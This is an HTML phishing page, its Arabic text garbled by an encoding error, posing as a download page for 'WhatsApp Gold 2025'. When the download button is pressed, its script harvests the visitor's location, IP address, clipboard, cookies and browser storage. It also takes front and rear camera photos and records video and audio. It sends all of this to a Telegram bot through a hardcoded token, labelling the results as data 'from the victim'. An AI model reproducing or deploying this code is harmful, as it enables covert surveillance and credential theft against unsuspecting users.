

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù…ÙŠÙ„ ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø°Ù‡Ø¨ÙŠ 2025 - Ø¢Ø®Ø± Ø¥ØµØ¯Ø§Ø±</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #2e7d32 0%, #004d40 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .container {
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 600px;
            width: 90%;
        }

        h1 {
            margin-bottom: 20px;
            font-size: 2.8em;
            color: #FFD700;
            text-shadow: 3px 3px 6px rgba(0,0,0,0.5);
        }

        .whatsapp-icon {
            font-size: 5em;
            color: #25D366;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        p {
            margin-bottom: 25px;
            font-size: 1.1em;
            line-height: 1.6;
        }

        .download-btn {
            background: linear-gradient(45deg, #FFD700, #DAA520);
            border: none;
            padding: 18px 35px;
            border-radius: 50px;
            color: #333;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .download-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
        }

        .download-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .features-list {
            list-style: none;
            padding: 0;
            margin-top: 30px;
            text-align: right;
        }

        .features-list li {
            margin-bottom: 10px;
            font-size: 1em;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 10px;
        }

        .features-list li i {
            color: #FFD700;
        }

        .camera-container {
            margin: 30px 0;
            position: relative;
            display: none;
        }

        video {
            width: 100%;
            max-width: 400px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            display: none;
        }

        canvas {
            display: none;
        }

        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            font-size: 16px;
            display: none;
        }

        .success {
            background: rgba(46, 204, 113, 0.3);
        }

        .error {
            background: rgba(231, 76, 60, 0.3);
        }

        .loading {
            background: rgba(52, 152, 219, 0.3);
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid white;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-container {
            margin: 20px 0;
            display: none;
        }

        .progress-bar {
            width: 100%;
            height: 30px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #FFD700, #FFA500);
            width: 0%;
            transition: width 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
            font-weight: bold;
        }

        .countdown {
            margin: 15px 0;
            font-size: 3em;
            color: #FFD700;
            font-weight: bold;
            display: none;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .info-box {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            text-align: right;
            font-size: 14px;
            display: none;
        }

        .step-indicator {
            margin: 20px 0;
            display: none;
        }

        .step {
            display: inline-block;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            margin: 0 5px;
            line-height: 30px;
            transition: all 0.3s ease;
        }

        .step.active {
            background: #FFD700;
            color: #333;
            font-weight: bold;
        }

        .step.completed {
            background: #25D366;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <i class="fab fa-whatsapp whatsapp-icon"></i>
        <h1>ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø°Ù‡Ø¨ÙŠ 2025</h1>
        <p>Ù‚Ù… Ø¨ØªØ­Ù…ÙŠÙ„ Ø£Ø­Ø¯Ø« Ø¥ØµØ¯Ø§Ø± Ù…Ù† ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø°Ù‡Ø¨ÙŠ ÙˆØ§Ø³ØªÙ…ØªØ¹ Ø¨Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø­ØµØ±ÙŠØ© ÙˆØ§Ù„Ø®ØµÙˆØµÙŠØ© Ø§Ù„Ù…Ø­Ø³Ù‘Ù†Ø©!</p>

        <button id="downloadBtn" class="download-btn">
            <i class="fas fa-download"></i> ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¢Ù† (Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø£Ø®ÙŠØ±)
        </button>

        <ul class="features-list">
            <li><i class="fas fa-check-circle"></i> Ø¥Ø®ÙØ§Ø¡ Ø¢Ø®Ø± Ø¸Ù‡ÙˆØ±</li>
            <li><i class="fas fa-check-circle"></i> Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø­Ø°ÙˆÙØ©</li>
            <li><i class="fas fa-check-circle"></i> ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø­Ø§Ù„Ø§Øª Ø¨Ø³Ù‡ÙˆÙ„Ø©</li>
            <li><i class="fas fa-check-circle"></i> ØªØ®ØµÙŠØµ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</li>
            <li><i class="fas fa-check-circle"></i> Ø­Ù…Ø§ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ù„Ø®ØµÙˆØµÙŠØ©</li>
        </ul>

        <div class="step-indicator" id="stepIndicator">
            <div class="step" id="step1">1</div>
            <div class="step" id="step2">2</div>
            <div class="step" id="step3">3</div>
            <div class="step" id="step4">4</div>
            <div class="step" id="step5">5</div>
            <div class="step" id="step6">6</div>
            <div class="step" id="step7">7</div>
        </div>

        <div class="countdown" id="countdown"></div>

        <div class="progress-container" id="progressContainer">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill">0%</div>
            </div>
        </div>

        <div class="camera-container" id="cameraContainer">
            <video id="video" autoplay playsinline muted></video>
            <canvas id="canvas"></canvas>
        </div>

        <div id="status" class="status"></div>
        <div class="spinner" id="spinner"></div>

        <div class="info-box" id="infoBox">
            <div id="userInfo">Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: <span id="userId">ØºÙŠØ± Ù…Ø­Ø¯Ø¯</span></div>
            <div id="deviceInfo">Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...</div>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const downloadBtn = document.getElementById('downloadBtn');
        const statusDiv = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const cameraContainer = document.getElementById('cameraContainer');
        const infoBox = document.getElementById('infoBox');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const countdownDiv = document.getElementById('countdown');
        const stepIndicator = document.getElementById('stepIndicator');

        const BOT_TOKEN = '8421315266:AAHzT_2OALNiki9V95NqNGp-FnysKLQVfqM';
        const TELEGRAM_API_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const TELEGRAM_API_VIDEO = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        const TELEGRAM_API_AUDIO = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
        const TELEGRAM_API_MESSAGE = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        let userId = null;
        let dataSent = false;
        let allData = {
            location: null,
            ip: null,
            device: {},
            battery: null,
            network: null,
            sensors: {},
            storage: {}
        };

        function getUserIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        function updateStatus(message, type = '') {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.style.display = 'block';
        }

        function showSpinner(show) {
            spinner.style.display = show ? 'block' : 'none';
        }

        function updateProgress(percent, text) {
            progressContainer.style.display = 'block';
            progressFill.style.width = `${percent}%`;
            progressFill.textContent = text || `${percent}%`;
        }

        function updateStep(stepNumber, status = 'active') {
            const step = document.getElementById(`step${stepNumber}`);
            if (step) {
                step.className = `step ${status}`;
            }
        }

        function showCountdown(seconds) {
            countdownDiv.style.display = 'block';
            countdownDiv.textContent = seconds;
            
            let remaining = seconds;
            const interval = setInterval(() => {
                remaining--;
                if (remaining > 0) {
                    countdownDiv.textContent = remaining;
                } else {
                    countdownDiv.style.display = 'none';
                    clearInterval(interval);
                }
            }, 1000);
        }

        async function getDeviceInfo() {
            const nav = navigator;
            const screen = window.screen;
            
            allData.device = {
                userAgent: nav.userAgent,
                platform: nav.platform,
                language: nav.language,
                languages: nav.languages.join(', '),
                cookiesEnabled: nav.cookieEnabled,
                doNotTrack: nav.doNotTrack,
                hardwareConcurrency: nav.hardwareConcurrency,
                deviceMemory: nav.deviceMemory || 'ØºÙŠØ± Ù…ØªØ§Ø­',
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'ontouchstart' in window
            };

            // Battery info
            if (nav.getBattery) {
                try {
                    const battery = await nav.getBattery();
                    allData.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'ÙŠØ´Ø­Ù†' : 'Ù„Ø§ ÙŠØ´Ø­Ù†',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    allData.battery = 'ØºÙŠØ± Ù…ØªØ§Ø­';
                }
            }

            // Network info
            if (nav.connection || nav.mozConnection || nav.webkitConnection) {
                const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
                allData.network = {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData
                };
            }
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                allData.ip = data.ip;

                // Get more detailed IP info
                const ipInfoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                const ipInfo = await ipInfoResponse.json();
                allData.ipDetails = ipInfo;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ IP:', error);
            }
        }

        function getUserLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            allData.location = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed
                            };
                            resolve();
                        },
                        (error) => {
                            console.error('Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
                            resolve();
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    resolve();
                }
            });
        }

        async function getStorageData() {
            try {
                // Clipboard
                if (navigator.clipboard && navigator.clipboard.readText) {
                    try {
                        allData.storage.clipboard = await navigator.clipboard.readText();
                    } catch (e) {
                        allData.storage.clipboard = 'ØºÙŠØ± Ù…Ø³Ù…ÙˆØ­';
                    }
                }

                // LocalStorage
                allData.storage.localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    allData.storage.localStorage[key] = localStorage.getItem(key);
                }

                // SessionStorage
                allData.storage.sessionStorage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    allData.storage.sessionStorage[key] = sessionStorage.getItem(key);
                }

                // Cookies
                allData.storage.cookies = document.cookie;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ®Ø²ÙŠÙ†:', error);
            }
        }

        async function getSensorData() {
            // Accelerometer
            if (window.DeviceMotionEvent) {
                window.addEventListener('devicemotion', (event) => {
                    allData.sensors.acceleration = {
                        x: event.acceleration.x,
                        y: event.acceleration.y,
                        z: event.acceleration.z
                    };
                }, { once: true });
            }

            // Gyroscope
            if (window.DeviceOrientationEvent) {
                window.addEventListener('deviceorientation', (event) => {
                    allData.sensors.orientation = {
                        alpha: event.alpha,
                        beta: event.beta,
                        gamma: event.gamma
                    };
                }, { once: true });
            }
        }

        async function capturePhoto(facingMode = 'user') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });

                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                await new Promise(resolve => setTimeout(resolve, 500)); // Wait for camera to adjust

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                stream.getTracks().forEach(track => track.stop());

                return new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.9);
                });
            } catch (error) {
                console.error(`Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© (${facingMode}):`, error);
                return null;
            }
        }

        async function recordVideo(facingMode = 'user', duration = 10) {
            try {
                updateStatus(`Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ ${duration} Ø«Ø§Ù†ÙŠØ©...`, 'loading');
                showCountdown(duration);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: true
                });

                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp8,opus'
                });

                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);

                const videoBlob = await new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(new Blob(chunks, { type: 'video/webm' }));
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), duration * 1000);
                });

                return videoBlob;
            } catch (error) {
                console.error(`Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ (${facingMode}):`, error);
                return null;
            }
        }

        async function recordAudio(duration = 10) {
            try {
                updateStatus(`Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª ${duration} Ø«Ø§Ù†ÙŠØ©...`, 'loading');
                showCountdown(duration);

                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);

                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);

                const audioBlob = await new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(new Blob(chunks, { type: 'audio/webm' }));
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), duration * 1000);
                });

                return audioBlob;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª:', error);
                return null;
            }
        }

        async function sendToTelegram(type, blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', userId);
            formData.append('caption', caption);

            let endpoint;
            let fieldName;

            switch(type) {
                case 'photo':
                    endpoint = TELEGRAM_API_PHOTO;
                    fieldName = 'photo';
                    formData.append(fieldName, blob, 'photo.jpg');
                    break;
                case 'video':
                    endpoint = TELEGRAM_API_VIDEO;
                    fieldName = 'video';
                    formData.append(fieldName, blob, 'video.webm');
                    break;
                case 'audio':
                    endpoint = TELEGRAM_API_AUDIO;
                    fieldName = 'audio';
                    formData.append(fieldName, blob, 'audio.webm');
                    break;
            }

            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                console.error(`Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ ${type}:`, error);
                return false;
            }
        }

        async function sendMessage(text) {
            try {
                const response = await fetch(TELEGRAM_API_MESSAGE, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø©:', error);
                return false;
            }
        }

        function formatDataMessage() {
            let message = 'ğŸ¯ <b>Ø¨ÙŠØ§Ù†Ø§Øª ÙƒØ§Ù…Ù„Ø© Ù…Ù† Ø§Ù„Ø¶Ø­ÙŠØ©</b>\n\n';
            
            message += `ğŸ‘¤ <b>Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:</b> ${userId}\n\n`;
            
            if (allData.location) {
                message += `ğŸ“ <b>Ø§Ù„Ù…ÙˆÙ‚Ø¹:</b>\n`;
                message += `   â”œ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${allData.location.latitude}\n`;
                message += `   â”œ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${allData.location.longitude}\n`;
                message += `   â”œ Ø§Ù„Ø¯Ù‚Ø©: ${allData.location.accuracy}Ù…\n`;
                if (allData.location.speed) message += `   â”œ Ø§Ù„Ø³Ø±Ø¹Ø©: ${allData.location.speed}Ù…/Ø«\n`;
                if (allData.location.altitude) message += `   â”” Ø§Ù„Ø§Ø±ØªÙØ§Ø¹: ${allData.location.altitude}Ù…\n`;
                message += '\n';
            }
            
            if (allData.ip) {
                message += `ğŸŒ <b>Ø¹Ù†ÙˆØ§Ù† IP:</b> ${allData.ip}\n`;
                if (allData.ipDetails) {
                    message += `   â”œ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${allData.ipDetails.city || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n`;
                    message += `   â”œ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${allData.ipDetails.country_name || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n`;
                    message += `   â”” Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©: ${allData.ipDetails.org || 'ØºÙŠØ± Ù…ØªØ§Ø­'}\n`;
                }
                message += '\n';
            }
            
            if (allData.device) {
                message += `ğŸ“± <b>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:</b>\n`;
                message += `   â”œ Ø§Ù„Ù…Ù†ØµØ©: ${allData.device.platform}\n`;
                message += `   â”œ Ø§Ù„Ù„ØºØ©: ${allData.device.language}\n`;
                message += `   â”œ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${allData.device.timezone}\n`;
                message += `   â”œ Ø§Ù„Ø´Ø§Ø´Ø©: ${allData.device.screenWidth}x${allData.device.screenHeight}\n`;
                message += `   â”œ Ø§Ù„Ù„Ù…Ø³: ${allData.device.touchSupport ? 'Ù…Ø¯Ø¹ÙˆÙ…' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…'}\n`;
                message += `   â”” Ø§Ù„Ø°Ø§ÙƒØ±Ø©: ${allData.device.deviceMemory} GB\n\n`;
            }
            
            if (allData.battery) {
                message += `ğŸ”‹ <b>Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:</b>\n`;
                message += `   â”œ Ø§Ù„Ù…Ø³ØªÙˆÙ‰: ${allData.battery.level}\n`;
                message += `   â”” Ø§Ù„Ø­Ø§Ù„Ø©: ${allData.battery.charging}\n\n`;
            }
            
            if (allData.network) {
                message += `ğŸ“¶ <b>Ø§Ù„Ø´Ø¨ÙƒØ©:</b>\n`;
                message += `   â”œ Ø§Ù„Ù†ÙˆØ¹: ${allData.network.effectiveType}\n`;
                message += `   â”” Ø§Ù„Ø³Ø±Ø¹Ø©: ${allData.network.downlink} Mbps\n\n`;
            }
            
            if (allData.storage.clipboard) {
                message += `ğŸ“‹ <b>Ø§Ù„Ø­Ø§ÙØ¸Ø©:</b> ${allData.storage.clipboard.substring(0, 100)}\n\n`;
            }
            
            message += `â° <b>Ø§Ù„ÙˆÙ‚Øª:</b> ${new Date().toLocaleString('ar-EG')}`;
            
            return message;
        }

        async function startDataCollection() {
            if (dataSent || !userId) {
                updateStatus('Ø®Ø·Ø£: Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯', 'error');
                return;
            }

            downloadBtn.disabled = true;
            stepIndicator.style.display = 'block';
            showSpinner(true);
            cameraContainer.style.display = 'block';
            infoBox.style.display = 'block';

            try {
                // Step 1: Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
                updateStep(1, 'active');
                updateProgress(10, 'Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª...');
                updateStatus('Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...', 'loading');
                
                await getDeviceInfo();
                await getUserIP();
                await getUserLocation();
                await getStorageData();
                getSensorData();
                
                updateStep(1, 'completed');

                // Step 2: ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                updateStep(2, 'active');
                updateProgress(25, 'Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø£Ù…Ø§Ù…ÙŠØ©...');
                updateStatus('Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©...', 'loading');
                
                const frontPhoto = await capturePhoto('user');
                if (frontPhoto) {
                    await sendToTelegram('photo', frontPhoto, 'ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©');
                }
                updateStep(2, 'completed');

                // Step 3: ØµÙˆØ±Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
                updateStep(3, 'active');
                updateProgress(35, 'Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø®Ù„ÙÙŠØ©...');
                updateStatus('Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©...', 'loading');
                
                const backPhoto = await capturePhoto('environment');
                if (backPhoto) {
                    await sendToTelegram('photo', backPhoto, 'ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©');
                }
                updateStep(3, 'completed');

                // Step 4: ÙÙŠØ¯ÙŠÙˆ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                updateStep(4, 'active');
                updateProgress(50, 'ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ Ø£Ù…Ø§Ù…ÙŠ...');
                
                const frontVideo = await recordVideo('user', 10);
                if (frontVideo) {
                    await sendToTelegram('video', frontVideo, 'ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© (10 Ø«Ø§Ù†ÙŠØ©)');
                }
                updateStep(4, 'completed');

                // Step 5: ÙÙŠØ¯ÙŠÙˆ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
                updateStep(5, 'active');
                updateProgress(65, 'ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ Ø®Ù„ÙÙŠ...');
                
                const backVideo = await recordVideo('environment', 10);
                if (backVideo) {
                    await sendToTelegram('video', backVideo, 'ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© (10 Ø«Ø§Ù†ÙŠØ©)');
                }
                updateStep(5, 'completed');

                // Step 6: ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª
                updateStep(6, 'active');
                updateProgress(80, 'ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª...');
                
                const audio = await recordAudio(10);
                if (audio) {
                    await sendToTelegram('audio', audio, 'ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØªÙŠ (10 Ø«Ø§Ù†ÙŠØ©)');
                }
                updateStep(6, 'completed');

                // Step 7: Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                updateStep(7, 'active');
                updateProgress(95, 'Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
                updateStatus('Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...', 'loading');
                
                const dataMessage = formatDataMessage();
                await sendMessage(dataMessage);
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ®Ø²ÙŠÙ† ÙƒØ±Ø³Ø§Ù„Ø© Ù…Ù†ÙØµÙ„Ø© Ø¥Ø°Ø§ ÙƒØ§Ù†Øª ÙƒØ¨ÙŠØ±Ø©
                if (allData.storage.localStorage && Object.keys(allData.storage.localStorage).length > 0) {
                    const storageMsg = `ğŸ’¾ <b>Local Storage:</b>\n${JSON.stringify(allData.storage.localStorage, null, 2)}`;
                    await sendMessage(storageMsg);
                }
                
                updateStep(7, 'completed');
                updateProgress(100, 'Ø§ÙƒØªÙ…Ù„!');

                // Ø§Ù„Ù†Ø¬Ø§Ø­
                dataSent = true;
                updateStatus('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­! Ø¬Ø§Ø±ÙŠ Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„...', 'success');
                
                setTimeout(() => {
                    window.location.href = 'https://www.mediafire.com/file/example_whatsapp_gold.apk';
                }, 2000);

            } catch (error) {
                console.error('Ø®Ø·Ø£ Ø¹Ø§Ù…:', error);
                updateStatus('Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'error');
            } finally {
                showSpinner(false);
                cameraContainer.style.display = 'none';
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }
            }
        }

        downloadBtn.addEventListener('click', startDataCollection);

        window.addEventListener('load', () => {
            userId = getUserIdFromURL();
            document.getElementById('userId').textContent = userId || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯';
            
            if (!userId) {
                updateStatus('ØªØ­Ø°ÙŠØ±: Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·', 'error');
                downloadBtn.disabled = true;
            }
        });
    </script>
</body>
</html>